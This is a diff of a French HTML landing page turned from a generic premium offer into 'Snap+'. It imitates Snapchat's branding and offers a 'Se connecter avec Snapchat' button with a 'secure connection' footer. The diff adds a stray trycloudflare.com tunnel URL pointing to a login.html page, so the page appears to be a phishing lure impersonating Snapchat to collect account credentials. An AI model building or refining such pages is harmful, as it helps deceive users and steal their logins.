@@ -1,11 +1,10 @@
 <!DOCTYPE html>
-
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <title>Mon offre Premium</title>
+  <title>Snap+</title>
 
   <style>
     * {
@@ -16,97 +15,130 @@
 
     body {
       min-height: 100vh;
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: #121212;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background:
+        radial-gradient(circle at 20% 20%, rgba(255, 225, 0, 0.12), transparent 30%),
+        radial-gradient(circle at 80% 80%, rgba(255, 225, 0, 0.08), transparent 30%),
+        #050505;
       color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
     }
 
     .container {
-      width: min(90%, 420px);
+      width: 90%;
+      max-width: 480px;
       text-align: center;
-      padding: 40px 25px;
-      border-radius: 24px;
-      background: #1e1e1e;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+      padding: 50px 35px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 28px;
+      background: rgba(255, 255, 255, 0.045);
+      backdrop-filter: blur(25px);
+      -webkit-backdrop-filter: blur(25px);
+      box-shadow:
+        0 25px 80px rgba(0, 0, 0, 0.55),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
     }
 
-    .badge {
-      display: inline-block;
-      padding: 8px 14px;
-      margin-bottom: 20px;
-      border-radius: 30px;
-      background: #333;
-      font-size: 14px;
+    .logo {
+      width: 76px;
+      height: 76px;
+      margin: 0 auto 25px;
+      border-radius: 22px;
+      background: #fffc00;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #050505;
+      font-size: 32px;
+      font-weight: 900;
+      box-shadow: 0 0 45px rgba(255, 252, 0, 0.2);
     }
 
     h1 {
-      font-size: 42px;
-      margin-bottom: 15px;
+      font-size: 48px;
+      letter-spacing: -2px;
+      margin-bottom: 12px;
     }
 
-    p {
-      color: #bdbdbd;
-      line-height: 1.6;
-      margin-bottom: 30px;
+    .subtitle {
+      color: #999;
+      font-size: 16px;
+      margin-bottom: 35px;
     }
 
-    .button {
-      display: inline-block;
+    .login-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
       width: 100%;
-      padding: 17px;
-      border-radius: 14px;
-
-      background: white;
-      color: black;
-
-      font-size: 17px;
-      font-weight: bold;
+      min-height: 58px;
+      padding: 0 25px;
+      border-radius: 16px;
+      background: #fffc00;
+      color: #050505;
       text-decoration: none;
-
-      transition: transform 0.2s ease, opacity 0.2s ease;
+      font-size: 16px;
+      font-weight: 700;
+      transition: all 0.25s ease;
+      box-shadow: 0 10px 30px rgba(255, 252, 0, 0.12);
     }
 
-    .button:hover {
-      transform: scale(1.03);
-      opacity: 0.9;
+    .login-button:hover {
+      transform: translateY(-3px);
+      background: #fff91a;
+      box-shadow: 0 15px 40px rgba(255, 252, 0, 0.22);
+    }
+
+    .login-button:active {
+      transform: translateY(0);
     }
 
     .footer {
-      margin-top: 25px;
+      margin-top: 28px;
+      color: #666;
       font-size: 12px;
-      color: #777;
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 40px 25px;
+      }
+
+      h1 {
+        font-size: 40px;
+      }
     }
   </style>
-
 </head>
 
 <body>
 
   <main class="container">
 
-```
-<div class="badge">✨ Offre Premium</div>
+    <div class="logo">S+</div>
 
-<h1>Mon offre +</h1>
+    <h1>Snap+</h1>
 
-<p>
-  Découvrez une expérience premium et explorez les fonctionnalités proposées.
-</p>
+    <p class="subtitle">
+      Bienvenue sur votre espace Snap+
+    </p>
 
-<a <a class="button" href="https://ton-domaine-de-destination.example">
-  Découvrir l'offre
-</a>
+    https://portion-approaches-campaigns-neighbor.trycloudflare.com/login.html
+    <a
+      class="login-button"
+      href="https://accounts.snapchat.com/accounts/login"
+    >
+      Se connecter avec Snapchat
+    </a>
 
-<div class="footer">
-  Projet indépendant
-</div>
-```
+    <p class="footer">
+      Connexion sécurisée via Snapchat
+    </p>
 
   </main>
 
 </body>
 </html>
-
